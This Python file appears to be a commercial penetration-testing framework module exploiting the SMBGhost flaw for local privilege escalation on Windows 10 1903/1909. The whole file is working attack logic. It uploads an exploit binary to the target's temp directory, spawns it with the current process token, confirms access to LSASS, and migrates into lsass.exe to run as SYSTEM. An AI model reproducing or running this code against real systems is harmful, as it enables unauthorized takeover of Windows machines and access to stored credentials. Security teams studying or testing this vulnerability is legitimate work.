#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  smbghost_lpe.py
## Description:  A vulnerability exists in the SMB 3.1.1 protocol allowing attackers to
##               achieve RCE or locally elevate privileges to System Integrity level
##               (aka SYSTEM privileges) from Medium Integrity Level (non-admin user).
## Created_On :  May 27 2020
## Created_By :  Nox
##
## (c) Copyright 2020, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import time
import yaml
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
from exploitutils import *
from libs.canvasos import canvasos
from libs.node_utils import update_graph_node

from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from ExploitTypes.localexploit import LocalExploit

module_path = os.path.dirname(os.path.realpath(__file__))
with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.node           = None
        self.name           = NAME
        self.local_path     = os.path.dirname(__file__)
        self.binaries_path  = os.path.join(self.local_path, "Resources")

    def write_file_remote(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        xpl_orig_name = "exploit_w10_x86.exe"
        if t_os.arch == "x64":
            xpl_orig_name = "exploit_w10_x64.exe"

        local_exploit_path = os.path.join(self.binaries_path, xpl_orig_name)

        tmp_path = self.node.shell.GetTempPathA()
        if not tmp_path:
            logging.error("Could not resolve full temp directory path")
            return False
        else:
            logging.info("Temp directory: %s" % tmp_path)

        if self.node.shell.chdir(tmp_path) < 0:
            logging.error("Could not chdir into %s" % tmp_path)
            return False

        remote_exploit_name = "%s.exe" % random.randint(10001, 99999)
        remote_exploit_path = tmp_path + remote_exploit_name

        if not self.nodeUpload(local_exploit_path, remote_exploit_path):
            logging.error("Failed to upload the EXE")
            return False

        return remote_exploit_path

    def test_process_access(self, process_name):
        # test that we even need to use an exploit
        process_list = self.node.shell.processlist()

        for process in process_list:
            if process["exe"] == process_name:
                pid = process["pid"]
                logging.info("Found LSASS.exe PID: %d" % pid)
                break

        # try to get a handle to lsass
        h_process = self.node.shell.openprocess(pid)

        if h_process:
            logging.info("Handle opened to LSASS successfully!")
            ret = 1
        else:
            logging.error("Not enough privileges to access LSASS.")
            ret = 0

        self.node.shell.CloseHandle(h_process)

        return ret


    def spawn_process(self, path, args):
        logging.info("Spawning exploit: %s" % path)

        try:
            cmd_line = path + " " + args
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 0,
                                                 dwCreationFlags = 0x08000000)
            return True
        except Exception, ex:
            logging.error("%s" % ex)
            return False

    def run_attack(self, node):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.node = node
            if not self.is_windows_node():
                continue

            releaseid = [1903, 1909]
            if (self.is_win10_node() or self.is_win2016_node()):
                if self.get_releaseid() not in releaseid:
                    logging.error("Only Windows 10 [1903, 1909] is supported")
                    continue
            else:
                logging.error("Windows version not supported")
                continue

            if not (self.has_wow64() or self.is_64bit_node()):
                logging.error("Not a 64bit node, aborting")
                continue

            if self.compromised():
                logging.warning("It appears you are already running as LOCAL/SYSTEM")
                continue

            if "low" in self.node.shell.get_integrity_level():
                logging.error("The exploit doesn't work with low/appcontainer integrity level")
                continue

            pid  = self.node.shell.getpid()
            handle = self.node.shell.openprocess(pid, 0x400) # 0x400 PROCESS_QUERY_INFORMATION
            token = self.node.shell.openprocesstoken(handle, 0x20)

            path = self.write_file_remote()
            if path == False:
                continue

            arg1 = str(pid)
            arg2 = str(token)
            logging.info("PID: %d Token: %d" % (pid, token))
            args = arg1 + " " + arg2
            if not self.spawn_process(path, args):
                logging.critical('Could not spawn %s' % NAME)
                continue

            time.sleep(5)

            ac = self.test_process_access("lsass.exe")

            if ac:
                logging.info("Successful privilege escalation! Migrating to lsass.exe now")

                migrate = self.engine.getModuleExploit("mosdefmigrate")
                migrate.link(self)
                migrate.argsDict['pid'] = 'lsass.exe'
                mg = migrate.run()

                if not mg:
                    logging.error("Couldn't migrate, aborting..")
                    continue
                else:
                    logging.info("Exploit succeeded. Now living in lsass.exe")

            else:
                # failed to get a handle to lsass.exe our exploit failed
                logging.error("Exploit failed")
                logging.error("Target is probably not vulnerable")
                continue


            isSystem = False
            for i in range(0, 20):
                if self.compromised():
                    update_graph_node(node, self.engine, self.node.shell.whoami())
                    isSystem = True
                    break
                time.sleep(3)

            time.sleep(3)

            self.add_file_for_cleanup(path)

            if not isSystem:
                logging.error("Failed to get SYSTEM privileges" % NAME)
                logging.error("Target is probably not vulnerable")
                return False
            ret = 1
        return ret

    def run(self):
        success = 0
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                logging.error('Node %s not a Win32 node' % (node.getname()))
                continue
            ret = self.run_attack(node)
            if ret == 1:
                logging.warning("Successfully migrated to LSASS. We are now SYSTEM")
                success = 1
        return success


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
